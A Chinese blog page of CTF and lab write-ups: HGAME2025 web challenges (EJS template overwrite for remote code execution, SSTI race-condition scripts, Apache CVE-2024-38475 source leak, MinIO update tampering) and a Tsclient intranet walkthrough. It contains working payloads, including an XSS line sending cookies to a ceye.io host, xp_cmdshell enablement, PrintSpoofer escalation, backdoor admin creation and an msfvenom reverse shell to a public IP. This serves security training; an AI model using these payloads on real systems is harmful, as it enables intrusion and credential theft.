9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;无效的文件名\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;文件处理错误\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;没有选择文件\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;文件上传成功\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`服务器运行在 http://localhost:${port}`); 89}); 这题有点像24国赛的ezjs\n文章 - 对ejs引擎漏洞及函数特性的利用 - 先知社区\n可以看到在 /rename 路由\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); 这个路由会将uploads目录中的文件重命名\n我们可以利用这个路由，通过目录穿越对任意文件进行移动和重命名\n也就是说我们可以通过上传恶意的ejs到uploads目录，接着通过/rename路由将我们上传的恶意ejs文件覆写掉/路由的模板文件mortis.ejs实现RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 将ejs上传\n覆写原来的ejs\n访问/\n这题flag藏在环境变量里\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard 密码爆破，XSS cookie窃取\n爆出来 shallot/888888\n登进去看到一个留言板\n猜测是xss，测试一下\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; 同时通过dirsearch扫到了/admin路由\n根据这句话大概可以猜到，访问/admin路由的时候应该会在后端以admin的身份来访问留言板\n也就是说我们可以进行cookie窃取\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; 将payload输出在留言板，然后访问/admin\n成功拿到admin的cookie\n拿admin的cookie访问/flag即可拿到flag\nLevel 25 双面人派对 这道题有两个环境，一开始以为是re，其实感觉更像是misc\n访问app.service-web可以拿到一个main文件\n是一个elf文件\n用exeinfo PE查到用upx加壳了\n用upx官方工具就可以脱壳\nhttps://github.com/upx/upx/releases/latest\n脱壳之后用ida打开\n可以找到一段关于minio的密钥信息\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; 那我们大概就能猜到另一个环境应该就是这个minio的服务\n用mc通过Access Key和Secret Key连接上去\n里面有两个储存桶\n将两个储存桶都下载下来\n/hints里面放的是8080服务的源码，/prodbucket里面是源码编译后的文件叫做update，猜测是热更新\n看一下源码\n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} 我们可以猜测/路由展示的这个.目录就是前面我们下周main文件的目录\n我们可以把.改成根目录/，然后将编译后的源码覆写掉原来的update，热更新后，我们就能直接访问根目录了\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } 这里我将/路由改成了/abc，因为不知道为啥我用/路由不行\n将源码编译后覆写到储存桶上\n访问/abc\n拿到flag\nLevel 38475 角落 ssti/条件竞争\n/robots.txt有个/app.conf\n访问/app.conf\n这里展示了httpd.conf的片段\n这里给出了源码的位置还有一个重写引擎的规则，猜测应该是该版本的apache存在源码泄露\n同时在响应标头能找到Apache的版本信息\n可以找到这个版本的apache存在源码泄露，而且是跟重写规则有关\nCVE-2024-38475\n网上没找到什么poc\n但是可以找到漏洞发现者的一篇文章\nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-en/\n根据这篇文章我们可以构造出paylaod\nhttp://node1.hgame.vidar.club:31155/admin/usr/local/apache2/app/app.py%3F 这道题多了一个RewriteCond \u0026ldquo;%{HTTP_USER_AGENT}\u0026rdquo; \u0026ldquo;^L1nk/\u0026rdquo;，只需要在user-agent前面加上L1nk/即可\n拿到源码\n1from flask import Flask, request, render_template, render_template_string, redirect 2import os 3import templates 4 5app = Flask(__name__) 6pwd = os.path.dirname(__file__) 7show_msg = templates.show_msg 8 9 10def readmsg(): 11\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 12\tif os.path.exists(filename): 13\tf = open(filename, \u0026#39;r\u0026#39;) 14\tmessage = f.read() 15\tf.close() 16\treturn message 17\telse: 18\treturn \u0026#39;No message now.\u0026#39; 19 20 21@app.route(\u0026#39;/index\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 22def index(): 23\tstatus = request.args.get(\u0026#39;status\u0026#39;) 24\tif status is None: 25\tstatus = \u0026#39;\u0026#39; 26\treturn render_template(\u0026#34;index.html\u0026#34;, status=status) 27 28 29@app.route(\u0026#39;/send\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) 30def write_message(): 31\tfilename = pwd + \u0026#34;/tmp/message.txt\u0026#34; 32\tmessage = request.form[\u0026#39;message\u0026#39;] 33 34\tf = open(filename, \u0026#39;w\u0026#39;) 35\tf.write(message) 36\tf.close() 37 38\treturn redirect(\u0026#39;index?status=Send successfully!!\u0026#39;) 39\t40@app.route(\u0026#39;/read\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) 41def read_message(): 42\tif \u0026#34;{\u0026#34; not in readmsg(): 43\tshow = show_msg.replace(\u0026#34;{{message}}\u0026#34;, readmsg()) 44\treturn render_template_string(show) 45\treturn \u0026#39;waf!!\u0026#39; 46\t47 48if __name__ == \u0026#39;__main__\u0026#39;: 49\tapp.run(host = \u0026#39;0.0.0.0\u0026#39;, port = 5000) 可以看到/read路由存在ssti，但是他waf掉了最重要的{\n但是可以看到这个/send路由会将传入的信息写入message.txt文件，在访问/read路由的时候则会读取message.txt文件。这么一来我们就可以考虑通过竞争的方式来绕过waf了。竞争思路大概就是我在很短的时间内连续发送两条信息，第一条信息是合法信息，而第二条信息是不合法的，那么就会存在一种情况，当第一条信息通过了判断，接下来要将文件的内容插入到模板中渲染的时候，刚好第二条不合法的信息覆写了message.txt，那么插入模板中的就是第二条不合法的信息了\n接下来就是搓脚本发包\n三个脚本\npoc1\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) 8 poc2\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/send\u0026#34; 4 burp0_headers = {\u0026#34;Cache-Control\u0026#34;: \u0026#34;max-age=0\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;http://node1.hgame.vidar.club:30762/app/index\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 burp0_data = {\u0026#34;message\u0026#34;: \u0026#34;123\u0026#34;} 6 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 7 print(res.status_code) poc3\n1import requests 2while True: 3 burp0_url = \u0026#34;http://node1.hgame.vidar.club:30762/app/read\u0026#34; 4 burp0_headers = {\u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 5 res = requests.get(burp0_url, headers=burp0_headers) 6 # print(res.text) 7 if \u0026#34;hgame\u0026#34; in (res.text): 8 print(res.text) 9 break 成功执行，拿到flag\n","permalink":"http://localhost:1313/post/hgame2025-week1/","summary":"\u003ch2 id=\"web\"\u003eWeb\u003c/h2\u003e\n\u003ch3 id=\"week1\"\u003eweek1\u003c/h3\u003e\n\u003ch3 id=\"level-24-pacman\"\u003eLevel 24 Pacman\u003c/h3\u003e\n\u003cp\u003e拿到环境\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一个小游戏，猜测应该是js审计\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看index.js发现代码进行了混淆\u003c/p\u003e\n\u003cp\u003e可以用工具反混淆一下，增加一下可读性\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003e反混淆之后找到这个\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"关于"},{"content":"Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\n参考文章\n春秋云镜 TSclient \u0026ndash; Walkthrough - KingBridge - 博客园\n春秋云境 Tsclient | 初零·b10g~🥝\nFLAG1 先用fscan扫一下\nmssql服务是弱口令\nsa/1qaz!QAZ 用数据库管理工具连上去\n接下来要看mssql怎么进行命令执行\n参考文章：\nhttps://xz.aliyun.com/news/7129\n判断xp_cmdshell状态\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; 存在\n那我们接下来启动它\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; 配置选项 \u0026#39;xp_cmdshell\u0026#39; 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。 启动成功\n接下来就可以进行命令执行了\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; 接下来直接vshell一句话上线\n没找到flag，发现Administrator文件夹没有权限\n想到要提权，传一个PrintSpoofer进行提权\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd 提权之后拿到flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... 提权之后用提权后的账户重新上一下线\n接下来用fscan扫一下内网\n1┌──────────────────────────────────────────────┐ 2│ ___ _ │ 3│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 4│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 5│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 6│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 7└──────────────────────────────────────────────┘ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] 暴力破解线程数: 1 11[2025-03-09 19:53:19] [INFO] 开始信息扫描 12[2025-03-09 19:53:19] [INFO] CIDR范围: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] 生成IP范围: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] 解析CIDR 172.22.8.0/24 -\u0026gt; IP范围 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] 最终有效主机数量: 256 16[2025-03-09 19:53:20] [INFO] 开始主机扫描 17[2025-03-09 19:53:20] [INFO] 正在尝试无监听ICMP探测... 18[2025-03-09 19:53:20] [INFO] 当前用户权限不足,无法发送ICMP包 19[2025-03-09 19:53:20] [INFO] 切换为PING方式探测... 20[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.31 存活 (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.18 存活 (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.15 存活 (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.46 存活 (ICMP) 24[2025-03-09 19:53:23] [INFO] 存活主机数量: 4 25[2025-03-09 19:53:23] [INFO] 有效端口数量: 233 26[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] 端口开放 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] 服务识别 172.22.8.18:1433 =\u0026gt; [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] 服务识别 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] 存活端口数量: 17 61[2025-03-09 19:54:30] [INFO] 开始漏洞扫描 62[2025-03-09 19:54:30] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 64目标主机: 172.22.8.18 65主机名: WIN-WEB 66发现的网络接口: 67 IPv4地址: 68 └─ 172.22.8.18 69 IPv6地址: 70 └─ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 73目标主机: 172.22.8.15 74主机名: DC01 75发现的网络接口: 76 IPv4地址: 77 └─ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 79目标主机: 172.22.8.46 80主机名: WIN2016 81发现的网络接口: 82 IPv4地址: 83 └─ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 85目标主机: 172.22.8.31 86主机名: WIN19-CLIENT 87发现的网络接口: 88 IPv4地址: 89 └─ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.46 状态码:200 长度:703 标题:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.18 状态码:200 长度:703 标题:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] 扫描已完成: 32/32 扫到三台机子\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 没有什么能直接利用的服务\n那我们接着信息收集一下\nnet user 主机名: WIN-WEB\rOS 名称: Microsoft Windows Server 2016 Datacenter\rOS 版本: 10.0.14393 暂缺 Build 14393\rOS 制造商: Microsoft Corporation\rOS 配置: 独立服务器\rOS 构件类型: Multiprocessor Free\r注册的所有人:\r注册的组织: Aliyun\r产品 ID: 00376-40000-00000-AA947\r初始安装日期: 2022/7/11, 12:46:14\r系统启动时间: 2025/3/9, 18:28:29\r系统制造商: Alibaba Cloud\r系统型号: Alibaba Cloud ECS\r系统类型: x64-based PC\r处理器: 安装了 1 个处理器。\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS 版本: SeaBIOS 449e491, 2014/4/1\rWindows 目录: C:\\Windows\r系统目录: C:\\Windows\\system32\r启动设备: \\Device\\HarddiskVolume1\r系统区域设置: zh-cn;中文(中国)\r输入法区域设置: zh-cn;中文(中国)\r时区: (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐\r物理内存总量: 3,950 MB\r可用的物理内存: 883 MB\r虚拟内存: 最大值: 5,848 MB\r虚拟内存: 可用: 1,169 MB\r虚拟内存: 使用中: 4,679 MB\r页面文件位置: C:\\pagefile.sys\r域: WORKGROUP\r登录服务器: 暂缺\r修补程序: 安装了 6 个修补程序。\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\r网卡: 安装了 1 个 NIC。\r[01]: Red Hat VirtIO Ethernet Adapter\r连接名: 以太网\r启用 DHCP: 是\rDHCP 服务器: 172.22.255.253\rIP 地址\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V 要求: 已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。 C:\\Tmp\u0026gt;net user\r\\\\ 的用户帐户\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\r命令运行完毕，但发生一个或多个错误。 C:\\Tmp\u0026gt;quser\r用户名 会话名 ID 状态 空闲时间 登录时间\rjohn rdp-tcp#0 2 运行中 2:38 2025/3/9 18:30 发现一个john用户远程连接本台机子\n为了方便可以新建一个用户rdp连上去\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\r命令成功完成。\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\r命令成功完成。\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\r操作成功完成。 管理员权限可以偷RDP用户的token，从而查看其挂载的盘。\n这里可以用msf的incognito模块\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe 先用msf上个线\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit 上线\n接着用incognito模块偷John的token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT 